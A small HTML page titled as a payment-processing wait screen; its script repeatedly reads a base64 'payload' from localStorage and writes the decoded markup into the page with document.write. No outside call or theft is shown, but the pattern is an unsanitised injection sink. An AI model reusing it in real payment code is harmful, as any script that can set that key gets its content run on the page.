<!doctype html>
<html>
  <head>
    <title>Processing payment, please wait...</title>
    <meta charset="utf-8">
  </head>
  <body>
    <div id="target"></div>
    <script>
      setInterval(function(){
        var payload = localStorage.getItem('payload');
        if(payload){
          document.write(atob(payload));
        }
      }, 200)
    </script>
  </body>
</html>